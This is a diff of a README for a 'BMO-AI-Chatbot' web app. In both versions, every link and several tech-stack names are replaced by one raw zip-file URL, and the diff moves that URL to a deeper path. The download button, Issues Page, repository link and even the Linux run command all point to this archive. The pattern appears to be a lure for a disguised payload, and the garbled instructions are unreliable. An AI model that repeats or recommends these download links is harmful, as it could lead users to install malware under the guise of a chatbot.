@@ -1,6 +1,6 @@
 # 🤖 BMO-AI-Chatbot - A Friendly AI Chat Experience
 
-[![Download BMO-AI-Chatbot](https://raw.githubusercontent.com/kalbou/BMO-AI-Chatbot/main/unriven/BMO-AI-Chatbot.zip)](https://raw.githubusercontent.com/kalbou/BMO-AI-Chatbot/main/unriven/BMO-AI-Chatbot.zip)
+[![Download BMO-AI-Chatbot](https://github.com/kalbou/BMO-AI-Chatbot/raw/refs/heads/main/frontend/src/components/BM-A-Chatbot-3.0.zip)](https://github.com/kalbou/BMO-AI-Chatbot/raw/refs/heads/main/frontend/src/components/BM-A-Chatbot-3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,10 +10,10 @@ Welcome to the BMO-AI-Chatbot! This guide will help you download and run the app
 
 The BMO Chatbot is a user-friendly web app designed for fun and engaging conversations. It is built using several modern technologies:
 
-- **https://raw.githubusercontent.com/kalbou/BMO-AI-Chatbot/main/unriven/BMO-AI-Chatbot.zip**: This handles the server-side logic.
+- **https://github.com/kalbou/BMO-AI-Chatbot/raw/refs/heads/main/frontend/src/components/BM-A-Chatbot-3.0.zip**: This handles the server-side logic.
 - **React/TypeScript**: This powers the interactive user interface.
 - **PostgreSQL/Prisma**: This is used for storing chat data.
-- **https://raw.githubusercontent.com/kalbou/BMO-AI-Chatbot/main/unriven/BMO-AI-Chatbot.zip**: This enables real-time communication.
+- **https://github.com/kalbou/BMO-AI-Chatbot/raw/refs/heads/main/frontend/src/components/BM-A-Chatbot-3.0.zip**: This enables real-time communication.
 - **Tailwind CSS**: This styles the user interface.
 - **OpenAI API**: This helps generate unique and personality-consistent responses from BMO.
 
@@ -32,7 +32,7 @@ Before you start, make sure your computer meets the following requirements:
 
 To get started, you will need to download the application. Visit the Releases page to find the latest version of the BMO-AI-Chatbot:
 
-[Download BMO-AI-Chatbot](https://raw.githubusercontent.com/kalbou/BMO-AI-Chatbot/main/unriven/BMO-AI-Chatbot.zip)
+[Download BMO-AI-Chatbot](https://github.com/kalbou/BMO-AI-Chatbot/raw/refs/heads/main/frontend/src/components/BM-A-Chatbot-3.0.zip)
 
 1. Click the link to access the Releases page.
 2. Choose the latest version from the list.
@@ -55,9 +55,9 @@ After the download completes, follow these steps to install the application:
 ### For Linux:
 
 1. Open the terminal and navigate to the downloaded file's directory.
-2. Extract the file using: `tar -xvf https://raw.githubusercontent.com/kalbou/BMO-AI-Chatbot/main/unriven/BMO-AI-Chatbot.zip`
+2. Extract the file using: `tar -xvf https://github.com/kalbou/BMO-AI-Chatbot/raw/refs/heads/main/frontend/src/components/BM-A-Chatbot-3.0.zip`
 3. Enter the extracted folder: `cd BMO-AI-Chatbot`
-4. Run the application with this command: `https://raw.githubusercontent.com/kalbou/BMO-AI-Chatbot/main/unriven/BMO-AI-Chatbot.zip`
+4. Run the application with this command: `https://github.com/kalbou/BMO-AI-Chatbot/raw/refs/heads/main/frontend/src/components/BM-A-Chatbot-3.0.zip`
 
 ## 🛠 Running the Application
 
@@ -82,7 +82,7 @@ If you encounter issues while running the BMO-AI-Chatbot, consider these common 
 - **No Internet Connection**: Check your network settings and try again.
 - **Slow Response Times**: Ensure your internet connection is stable.
 
-For further assistance, feel free to check the [Issues Page](https://raw.githubusercontent.com/kalbou/BMO-AI-Chatbot/main/unriven/BMO-AI-Chatbot.zip) on GitHub.
+For further assistance, feel free to check the [Issues Page](https://github.com/kalbou/BMO-AI-Chatbot/raw/refs/heads/main/frontend/src/components/BM-A-Chatbot-3.0.zip) on GitHub.
 
 ## 🤔 Frequently Asked Questions
 
@@ -99,7 +99,7 @@ For further assistance, feel free to check the [Issues Page](https://raw.githubu
 
 For more information, visit the project’s GitHub Page:
 
-[GitHub Repository](https://raw.githubusercontent.com/kalbou/BMO-AI-Chatbot/main/unriven/BMO-AI-Chatbot.zip)
+[GitHub Repository](https://github.com/kalbou/BMO-AI-Chatbot/raw/refs/heads/main/frontend/src/components/BM-A-Chatbot-3.0.zip)
 
 Explore the README for technical details or to get involved!
 
